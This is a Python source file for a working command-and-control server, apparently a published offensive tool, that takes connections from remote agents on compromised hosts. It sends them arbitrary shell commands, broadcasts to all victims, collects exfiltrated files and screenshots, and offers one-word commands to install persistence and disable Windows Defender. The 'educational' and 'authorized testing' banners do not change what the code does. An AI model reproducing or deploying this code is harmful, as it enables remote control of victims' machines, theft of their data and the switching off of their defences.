#!/usr/bin/env python3


"""
╔══════════════════════════════════════════════════════════════╗
║                    ADVANCED C2 SERVER                        ║
║                    Author: Jdexploit                         ║
║                    Created: 2026                             ║
║                    Purpose: Security Research                ║
╚══════════════════════════════════════════════════════════════╝
"""

import socket
import struct
import json
import base64
import time
import threading
import os
import sys
import readline
from datetime import datetime
from colorama import init, Fore, Back, Style

# Inicializar colorama para colores en terminal
init(autoreset=True)

class ProC2Server:
    def __init__(self, port=4444):
        self.port = port
        self.sessions = {}
        self.running = True
        self.author = "Jdexploit"
        self.version = "3.0"
        
    def _print_banner(self):
        """Mostrar banner personalizado"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}                    ADVANCED C2 SERVER                        {Fore.CYAN}║
║{Fore.GREEN}                    Author: {self.author}{" " * (38 - len(self.author))}{Fore.CYAN}║
║{Fore.MAGENTA}                    Version: {self.version}{" " * (36 - len(self.version))}{Fore.CYAN}║
║{Fore.WHITE}                    Port: {self.port}{" " * (39 - len(str(self.port)))}{Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}[+] Listening on 0.0.0.0:{self.port}
{Fore.YELLOW}[+] Type 'help' for available commands
{Fore.CYAN}[+] Waiting for agents...{Style.RESET_ALL}
        """
        print(banner)
    
    def _print_connection(self, session_id, info):
        """Mostrar información de conexión"""
        print(f"\n{Fore.GREEN}[+] {Fore.CYAN}NUEVA CONEXIÓN: {Fore.YELLOW}{session_id}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    ├─ Host: {Fore.WHITE}{info.get('hostname', 'Unknown')}")
        print(f"{Fore.CYAN}    ├─ User: {Fore.WHITE}{info.get('username', 'Unknown')}")
        print(f"{Fore.CYAN}    ├─ Priv: {Fore.GREEN if info.get('privileges') == 'Admin' else Fore.YELLOW}{info.get('privileges', 'Unknown')}")
        print(f"{Fore.CYAN}    ├─ OS: {Fore.WHITE}{info.get('os', 'Unknown')}")
        print(f"{Fore.CYAN}    └─ Time: {Fore.WHITE}{datetime.now().strftime('%H:%M:%S')}")
    
    def _print_response(self, session_id, command, result):
        """Mostrar respuesta del agente"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║ {Fore.YELLOW}RESPUESTA de {session_id}{' ' * (44 - len(session_id))}{Fore.CYAN}║")
        print(f"║ {Fore.GREEN}Comando: {command[:50]}{' ' * (46 - len(command[:50]))}{Fore.CYAN}║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if result.startswith('FILE:'):
            parts = result.split(':', 2)
            if len(parts) == 3:
                print(f"{Fore.GREEN}[+] Archivo recibido: {Fore.YELLOW}{parts[1]}{Style.RESET_ALL}")
                self._save_file(parts[1], parts[2])
        elif result.startswith('SCREENSHOT:'):
            filename = f"screenshot_{session_id}_{int(time.time())}.png"
            print(f"{Fore.GREEN}[+] Screenshot recibido: {Fore.YELLOW}{filename}{Style.RESET_ALL}")
            self._save_file(filename, result[11:])
        else:
            print(f"{result}")
        
        print(f"{Fore.CYAN}════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    def start(self):
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(100)
        
        # Mostrar banner
        self._print_banner()
        
        # Thread para aceptar conexiones
        accept_thread = threading.Thread(target=self._accept_connections, args=(sock,))
        accept_thread.daemon = True
        accept_thread.start()
        
        # Shell principal
        self._main_shell()
        
    def _accept_connections(self, sock):
        while self.running:
            try:
                client, addr = sock.accept()
                thread = threading.Thread(target=self._handle_agent, args=(client, addr))
                thread.daemon = True
                thread.start()
            except:
                break
    
    def _handle_agent(self, client, addr):
        session_id = f"{addr[0]}_{int(time.time())}"
        
        try:
            # Protocolo simple
            def recv_msg():
                try:
                    length_data = client.recv(4)
                    if not length_data:
                        return None
                    length = struct.unpack('>I', length_data)[0]
                    
                    data = b''
                    while len(data) < length:
                        chunk = client.recv(4096)
                        if not chunk:
                            return None
                        data += chunk
                    
                    return data.decode('utf-8', errors='ignore')
                except:
                    return None
            
            def send_msg(data):
                if isinstance(data, str):
                    data = data.encode()
                length = len(data)
                client.sendall(struct.pack('>I', length) + data)
            
            # Recibir handshake
            handshake = recv_msg()
            if handshake:
                try:
                    info = json.loads(handshake)
                    self.sessions[session_id] = {
                        'client': client,
                        'addr': addr,
                        'info': info,
                        'recv': recv_msg,
                        'send': send_msg,
                        'connected_at': datetime.now()
                    }
                    
                    # Mostrar información de conexión
                    self._print_connection(session_id, info)
                    
                    # Mantener para respuestas
                    self._keep_receiving(session_id)
                    
                except:
                    client.close()
        
        except:
            client.close()
    
    def _keep_receiving(self, session_id):
        """Recibir respuestas del agente"""
        while session_id in self.sessions:
            try:
                session = self.sessions[session_id]
                data = session['recv']()
                if data:
                    try:
                        response = json.loads(data)
                        if response.get('type') == 'command_result':
                            command = response.get('command', 'Unknown')
                            result = response.get('result', '')
                            self._print_response(session_id, command, result)
                    except:
                        # Respuesta no JSON
                        print(f"\n{Fore.YELLOW}[RAW] {session_id}:{Style.RESET_ALL}")
                        print(data[:500])
            except:
                time.sleep(0.1)
    
    def _main_shell(self):
        """Shell interactivo con autocompletado"""
        # Configurar autocompletado
        commands = ['sessions', 'session', 'help', 'clear', 'exit', 'commands', 'kill', 'broadcast', 'status']
        def complete(text, state):
            options = [cmd for cmd in commands if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        
        readline.parse_and_bind("tab: complete")
        readline.set_completer(complete)
        
        while self.running:
            try:
                prompt = f"{Fore.RED}c2{Fore.WHITE}@{Fore.GREEN}{self.author}{Fore.WHITE}> {Style.RESET_ALL}"
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() == 'exit':
                    self.running = False
                    print(f"\n{Fore.YELLOW}[!] Cerrando C2 Server...{Style.RESET_ALL}")
                    break
                
                elif cmd.lower() == 'help':
                    self._show_help()
                
                elif cmd.lower() == 'sessions':
                    self._list_sessions()
                
                elif cmd.lower().startswith('session '):
                    session_id = cmd[8:].strip()
                    self._session_shell(session_id)
                
                elif cmd.lower() == 'clear':
                    os.system('clear')
                    self._print_banner()
                
                elif cmd.lower() == 'commands':
                    self._show_commands()
                
                elif cmd.lower().startswith('kill '):
                    session_id = cmd[5:].strip()
                    self._kill_session(session_id)
                
                elif cmd.lower() == 'broadcast':
                    self._broadcast_command()
                
                elif cmd.lower() == 'status':
                    self._show_status()
                
                elif cmd.lower() == 'about':
                    self._show_about()
                
                else:
                    print(f"{Fore.RED}[!] Comando no reconocido. Usa 'help'{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Usa 'exit' para salir{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
    
    def _session_shell(self, session_id):
        if session_id not in self.sessions:
            print(f"{Fore.RED}[-] Sesión no encontrada: {session_id}{Style.RESET_ALL}")
            return
        
        session = self.sessions[session_id]
        info = session['info']
        
        print(f"\n{Fore.GREEN}[+] {Fore.CYAN}Sesión activa: {Fore.YELLOW}{session_id}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    Host: {Fore.WHITE}{info.get('hostname')}")
        print(f"{Fore.CYAN}    User: {Fore.WHITE}{info.get('username')}")
        print(f"{Fore.CYAN}    Type 'help' para comandos especiales{Style.RESET_ALL}\n")
        
        # Configurar autocompletado para sesión
        session_commands = ['back', 'help', 'info', 'download', 'upload', 'screenshot', 
                          'persistence', 'defender_off', 'shell', 'exit']
        
        def session_complete(text, state):
            options = [cmd for cmd in session_commands if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        
        readline.set_completer(session_complete)
        
        while session_id in self.sessions:
            try:
                prompt = f"{Fore.RED}c2{Fore.WHITE}@{Fore.YELLOW}{session_id[:10]}...{Fore.WHITE}> {Style.RESET_ALL}"
                cmd = input(prompt).strip()
                
                if cmd.lower() == 'back':
                    break
                
                elif cmd.lower() == 'help':
                    self._show_session_help()
                
                elif cmd.lower() == 'info':
                    self._send_command(session_id, 'sysinfo')
                
                # COMANDOS ESPECIALES
                elif cmd.lower().startswith('download '):
                    filepath = cmd[9:].strip()
                    self._send_command(session_id, f'download {filepath}')
                
                elif cmd.lower() == 'screenshot':
                    self._send_command(session_id, 'screenshot')
                
                elif cmd.lower() == 'persistence':
                    self._send_command(session_id, 'persistence')
                
                elif cmd.lower() == 'defender_off':
                    self._send_command(session_id, 'clear_defender')
                
                elif cmd.lower().startswith('upload '):
                    parts = cmd[7:].strip().split(' ', 1)
                    if len(parts) == 2:
                        local, remote = parts
                        if os.path.exists(local):
                            with open(local, 'rb') as f:
                                b64 = base64.b64encode(f.read()).decode('ascii')
                            self._send_command(session_id, f'upload {b64} {remote}')
                            print(f"{Fore.GREEN}[+] Archivo listo para upload: {local}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[-] Archivo no existe: {local}{Style.RESET_ALL}")
                
                # COMANDO NORMAL
                elif cmd.lower().startswith('shell '):
                    command = cmd[6:].strip()
                    self._send_command(session_id, command)
                
                elif cmd.lower() == 'exit':
                    self._send_command(session_id, 'exit')
                    break
                
                else:
                    # Comando directo
                    self._send_command(session_id, cmd)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Volviendo al menú principal...{Style.RESET_ALL}")
                break
        
        # Restaurar autocompletado global
        def global_complete(text, state):
            options = [cmd for cmd in ['sessions', 'session', 'help', 'clear', 'exit', 'commands'] 
                      if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        readline.set_completer(global_complete)
    
    def _send_command(self, session_id, command):
        """Enviar comando a agente"""
        if session_id not in self.sessions:
            print(f"{Fore.RED}[-] Sesión no existe: {session_id}{Style.RESET_ALL}")
            return
        
        session = self.sessions[session_id]
        cmd_data = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            session['send'](json.dumps(cmd_data))
            print(f"{Fore.GREEN}[+] Comando enviado: {Fore.YELLOW}{command[:50]}...{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[-] Error enviando comando{Style.RESET_ALL}")
            del self.sessions[session_id]
    
    def _save_file(self, filename, b64_data):
        """Guardar archivo descargado"""
        try:
            downloads_dir = "c2_downloads"
            os.makedirs(downloads_dir, exist_ok=True)
            filepath = os.path.join(downloads_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            
            size = os.path.getsize(filepath)
            print(f"{Fore.GREEN}[+] Guardado: {Fore.YELLOW}{filepath} {Fore.CYAN}({size} bytes){Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error guardando archivo: {e}{Style.RESET_ALL}")
    
    def _list_sessions(self):
        if not self.sessions:
            print(f"{Fore.YELLOW}[-] No hay sesiones activas{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[+] Sesiones activas ({len(self.sessions)}):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        
        for i, (sid, session) in enumerate(self.sessions.items(), 1):
            info = session['info']
            uptime = (datetime.now() - session['connected_at']).seconds
            
            print(f"{Fore.CYAN}║ {Fore.YELLOW}{i:2}. {sid}")
            print(f"{Fore.CYAN}║     {Fore.WHITE}Host: {info.get('hostname')}")
            print(f"{Fore.CYAN}║     {Fore.WHITE}User: {info.get('username')}")
            print(f"{Fore.CYAN}║     {Fore.WHITE}Priv: {Fore.GREEN if info.get('privileges') == 'Admin' else Fore.YELLOW}{info.get('privileges')}")
            print(f"{Fore.CYAN}║     {Fore.WHITE}Uptime: {uptime}s")
            print(f"{Fore.CYAN}║")
        
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    
    def _kill_session(self, session_id):
        """Terminar sesión"""
        if session_id in self.sessions:
            try:
                self._send_command(session_id, 'exit')
                print(f"{Fore.GREEN}[+] Sesión terminada: {session_id}{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}[-] Error terminando sesión{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Sesión no encontrada{Style.RESET_ALL}")
    
    def _broadcast_command(self):
        """Enviar comando a todas las sesiones"""
        if not self.sessions:
            print(f"{Fore.YELLOW}[-] No hay sesiones para broadcast{Style.RESET_ALL}")
            return
        
        command = input(f"{Fore.CYAN}Comando para broadcast: {Style.RESET_ALL}").strip()
        if not command:
            return
        
        confirm = input(f"{Fore.YELLOW}[?] Enviar a {len(self.sessions)} sesiones? (y/n): {Style.RESET_ALL}")
        if confirm.lower() != 'y':
            return
        
        for sid in list(self.sessions.keys()):
            self._send_command(sid, command)
    
    def _show_status(self):
        """Mostrar estado del servidor"""
        print(f"\n{Fore.GREEN}[+] C2 Server Status{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Autor:       {self.author}{' ' * (40 - len(self.author))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Versión:     {self.version}{' ' * (40 - len(self.version))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Puerto:      {self.port}{' ' * (40 - len(str(self.port)))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Sesiones:    {len(self.sessions)}{' ' * (40 - len(str(len(self.sessions))))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Hora:        {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{' ' * 23}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def _show_about(self):
        """Mostrar información del autor"""
        about = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}                     ABOUT JDEXPLOIT                         {Fore.CYAN}║
║{Fore.WHITE}                                                              {Fore.CYAN}║
║{Fore.GREEN}  Author:    Jdexploit                                        {Fore.CYAN}║
║{Fore.MAGENTA}  Tool:      Advanced C2 Server                              {Fore.CYAN}║
║{Fore.WHITE}  Version:    {self.version}{' ' * (44 - len(self.version))}{Fore.CYAN}║
║{Fore.CYAN}  Purpose:    Security Research & Education                   {Fore.CYAN}║
║{Fore.YELLOW}  Warning:    For authorized testing only!                   {Fore.CYAN}║
║{Fore.WHITE}                                                              {Fore.CYAN}║
║{Fore.GREEN}  GitHub:    https://github.com/JdExploit/                    {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(about)
    
    def _show_help(self):
        help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}                     C2 SERVER HELP                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}COMANDOS PRINCIPALES:{Style.RESET_ALL}
  {Fore.YELLOW}sessions{Style.RESET_ALL}          - Listar agentes conectados
  {Fore.YELLOW}session <id>{Style.RESET_ALL}      - Interactuar con agente específico
  {Fore.YELLOW}broadcast{Style.RESET_ALL}        - Enviar comando a todos los agentes
  {Fore.YELLOW}kill <id>{Style.RESET_ALL}        - Terminar sesión específica
  {Fore.YELLOW}status{Style.RESET_ALL}           - Mostrar estado del servidor
  {Fore.YELLOW}commands{Style.RESET_ALL}         - Mostrar comandos disponibles
  {Fore.YELLOW}clear{Style.RESET_ALL}            - Limpiar pantalla
  {Fore.YELLOW}about{Style.RESET_ALL}            - Información del autor
  {Fore.YELLOW}exit{Style.RESET_ALL}             - Salir del C2

{Fore.GREEN}EJEMPLOS:{Style.RESET_ALL}
  {Fore.CYAN}c2> {Fore.WHITE}sessions
  {Fore.CYAN}c2> {Fore.WHITE}session 192.168.1.100_1234567890
  {Fore.CYAN}c2> {Fore.WHITE}broadcast
  {Fore.CYAN}c2> {Fore.WHITE}status{Style.RESET_ALL}
        """
        print(help_text)
    
    def _show_session_help(self):
        help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}                 COMANDOS DE AGENTE                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}INFORMACIÓN:{Style.RESET_ALL}
  {Fore.YELLOW}info{Style.RESET_ALL}                 - Información del sistema
  {Fore.YELLOW}whoami{Style.RESET_ALL}              - Usuario actual
  {Fore.YELLOW}ipconfig /all{Style.RESET_ALL}       - Configuración de red
  {Fore.YELLOW}systeminfo{Style.RESET_ALL}          - Info completa del sistema

{Fore.GREEN}ARCHIVOS:{Style.RESET_ALL}
  {Fore.YELLOW}dir C:\\{Style.RESET_ALL}             - Listar directorio
  {Fore.YELLOW}download <ruta>{Style.RESET_ALL}     - Descargar archivo
  {Fore.YELLOW}upload <local> <remoto>{Style.RESET_ALL} - Subir archivo

{Fore.GREEN}PROCESOS:{Style.RESET_ALL}
  {Fore.YELLOW}tasklist{Style.RESET_ALL}            - Listar procesos
  {Fore.YELLOW}taskkill /PID <id>{Style.RESET_ALL}  - Matar proceso

{Fore.GREEN}RED:{Style.RESET_ALL}
  {Fore.YELLOW}netstat -ano{Style.RESET_ALL}        - Conexiones activas
  {Fore.YELLOW}route print{Style.RESET_ALL}         - Tabla de rutas

{Fore.GREEN}ESPECIALES:{Style.RESET_ALL}
  {Fore.YELLOW}screenshot{Style.RESET_ALL}          - Tomar captura de pantalla
  {Fore.YELLOW}persistence{Style.RESET_ALL}         - Instalar persistencia
  {Fore.YELLOW}defender_off{Style.RESET_ALL}        - Desactivar Windows Defender

{Fore.GREEN}EJEMPLOS:{Style.RESET_ALL}
  {Fore.CYAN}c2@session> {Fore.WHITE}shell whoami
  {Fore.CYAN}c2@session> {Fore.WHITE}download C:\\Windows\\System32\\drivers\\etc\\hosts
  {Fore.CYAN}c2@session> {Fore.WHITE}screenshot
  {Fore.CYAN}c2@session> {Fore.WHITE}persistence{Style.RESET_ALL}
        """
        print(help_text)
    
    def _show_commands(self):
        commands = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}               COMANDOS POPULARES                             {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}BÁSICOS:{Style.RESET_ALL}
  {Fore.YELLOW}shell whoami
  {Fore.YELLOW}shell ipconfig /all
  {Fore.YELLOW}shell systeminfo
  {Fore.YELLOW}shell net user
  {Fore.YELLOW}shell dir C:\\Users
  {Fore.YELLOW}shell tasklist
  {Fore.YELLOW}shell netstat -ano

{Fore.GREEN}AVANZADOS:{Style.RESET_ALL}
  {Fore.YELLOW}shell reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  {Fore.YELLOW}shell powershell Get-Process
  {Fore.YELLOW}shell powershell Get-Service
  {Fore.YELLOW}shell powershell Get-WmiObject Win32_Product

{Fore.GREEN}ESPECIALES:{Style.RESET_ALL}
  {Fore.YELLOW}download C:\\Windows\\System32\\drivers\\etc\\hosts
  {Fore.YELLOW}upload exploit.exe C:\\Windows\\Temp\\exploit.exe
  {Fore.YELLOW}screenshot
  {Fore.YELLOW}persistence{Style.RESET_ALL}
        """
        print(commands)

def main():
    print(f"\n{Fore.YELLOW}Inicializando C2 Server de Jdexploit...{Style.RESET_ALL}")
    
    # Verificar si colorama está instalado
    try:
        import colorama
    except ImportError:
        print(f"{Fore.RED}[!] Instala colorama para colores: pip install colorama{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Continuando sin colores...{Style.RESET_ALL}")
    
    # Crear directorio de descargas
    if not os.path.exists("c2_downloads"):
        os.makedirs("c2_downloads")
        print(f"{Fore.GREEN}[+] Directorio 'c2_downloads' creado{Style.RESET_ALL}")
    
    # Iniciar servidor
    server = ProC2Server(port=4444)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Server detenido por usuario{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    # Añadir información de copyright
    print(f"{Fore.CYAN}© 2024 Jdexploit - Advanced C2 Server{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}For educational purposes only!{Style.RESET_ALL}")
    print()
    main()
